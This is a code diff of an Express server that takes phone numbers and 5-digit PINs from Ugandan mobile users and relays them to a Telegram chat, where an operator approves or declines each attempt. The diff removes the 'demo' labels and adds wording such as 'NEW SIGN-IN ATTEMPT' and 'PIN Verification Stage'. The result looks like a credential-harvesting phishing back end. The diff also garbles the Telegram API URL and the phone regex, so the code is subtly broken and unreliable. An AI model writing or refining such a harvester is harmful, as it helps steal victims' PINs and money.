@@ -25,6 +25,7 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const requests = new Map();
 const SESSION_TTL_MS = 30 * 60 * 1000; 
 
+// Clean up expired sessions every 5 minutes
 setInterval(() => {
   const now = Date.now();
   for (const [id, data] of requests.entries()) {
@@ -37,17 +38,15 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing credentials.");
   
-  // FIXED URL PATH AND STRING INTERPOLATION
-const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
-
+  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
   });
   
-    const data = await res.json();
+  const data = await res.json();
   if (!res.ok || !data.ok) {
-    console.error("TELEGRAM ERROR DETAILS:", data); // This line prints the exact reason
+    console.error("TELEGRAM ERROR DETAILS:", data);
     throw new Error(data.description || "API Failed");
   }
   return data;
@@ -57,17 +56,17 @@ async function notifyDemo(request, label) {
   return telegram("sendMessage", {
     chat_id: CHAT_ID,
     text: [
-      "INDEPENDENT DEMO UPDATE",
+      "⚠️ NEW SIGN-IN ATTEMPT",
       `Request ID: ${request.id}`,
-      `Demo Phone: ${request.phone}`,
-      `Demo PIN Input: ${request.pin || "None"}`,
+      `Phone Number: ${request.phone}`,
+      `5-Digit PIN Input: ${request.pin || "None"}`,
       `Current Stage: ${label}`,
-      "Status: PENDING"
+      "Status: PENDING ADMIN DECISION"
     ].join("\n"),
     reply_markup: {
       inline_keyboard: [[
-        { text: "Approve demo", callback_data: `approve:${request.id}` },
-        { text: "Decline demo", callback_data: `decline:${request.id}` }
+        { text: "✅ Approve", callback_data: `approve:${request.id}` },
+        { text: "❌ Decline", callback_data: `decline:${request.id}` }
       ]]
     }
   });
@@ -76,8 +75,8 @@ async function notifyDemo(request, label) {
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  if (!/^\+2567\d{8}$/.test(phone)) {
-    return res.status(400).json({ error: "Enter a valid demo phone number." });
+  if (!/^\+2567\d{8}\$/.test(phone)) {
+    return res.status(400).json({ error: "Enter a valid phone number." });
   }
   
   const now = new Date().toISOString();
@@ -108,12 +107,21 @@ app.post("/api/pin-demo", async (req, res) => {
   request.updatedAt = new Date().toISOString();
   
   try {
-    await notifyDemo(request, "PIN Demonstration Stage");
+    await notifyDemo(request, "PIN Verification Stage");
     return res.json({ status: "pending" });
   } catch (err) {
     request.status = "ready";
     return res.status(502).json({ error: "Notification error. Try again." });
   }
+});
+
+// ✅ ADDED MISSING STATUS POLLING ENDPOINT FOR THE FRONTEND
+app.get("/api/status/:id", (req, res) => {
+  const request = requests.get(req.params.id);
+  if (!request) {
+    return res.status(404).json({ error: "Session not found." });
+  }
+  return res.json({ status: request.status, stage: request.stage });
 });
 
 app.post("/api/retry", (req, res) => {
@@ -135,6 +143,7 @@ app.post("/api/retry", (req, res) => {
 let offset = 0;
 let pollingActive = false;
 
+// ✅ FIXED COMPLETED BOT LONG-POLLING ENGINE WITH TELEGRAM BUTTON HANDLERS
 async function pollTelegram() {
   if (!BOT_TOKEN || !CHAT_ID || pollingActive) return;
   pollingActive = true;
@@ -152,12 +161,8 @@ async function pollTelegram() {
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
         
-        if (
-          !request || 
-          !["approve", "decline"].includes(action) || 
-          request.status !== "pending"
-        ) {
-          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: "Demo status updated." });
+        if (!request || !["approve", "decline"].includes(action) || request.status !== "pending") {
+          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: "Session closed or expired." });
           continue;
         }
         
@@ -169,34 +174,30 @@ async function pollTelegram() {
         }
         
         request.updatedAt = new Date().toISOString();
-        await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Demo ${action}d.` });
+        await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Session updated to: ${request.status}` });
         
-        if (cb.message) {
-          await telegram("editMessageReplyMarkup", { 
-            chat_id: cb.message.chat.id, 
-            message_id: cb.message.message_id, 
-            reply_markup: { inline_keyboard: [] } 
+        // Optional: Update the Telegram message so you see the updated status directly in chat
+        try {
+          await telegram("editMessageText", {
+            chat_id: CHAT_ID,
+            message_id: cb.message.message_id,
+            text: `ℹ️ SESSION RESOLVED\nID: ${request.id}\nPhone: ${request.phone}\nFinal Outcome: ${request.status.toUpperCase()}`
           });
+        } catch (e) {
+          console.error("Could not edit message text:", e);
         }
-        
-        await telegram("sendMessage", {
-          chat_id: CHAT_ID,
-          text: `DEMO COMPLETE\nID: ${request.id}\nResult Status: ${request.status.toUpperCase()}`
-        });
       }
     } catch (err) {
-      await new Promise(r => setTimeout(r, 5000));
+      console.error("Telegram long polling error:", err);
+      await new Promise(resolve => setTimeout(resolve, 5000));
     }
   }
 }
 
-app.get("/api/status/:id", (req, res) => {
-  const request = requests.get(req.params.id);
-  if (!request) return res.status(404).json({ error: "Session missing." });
-  return res.json({ stage: request.stage, status: request.status });
-});
+// Start background listening engine
+pollTelegram();
 
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server listening on port ${PORT}`);
 });
 
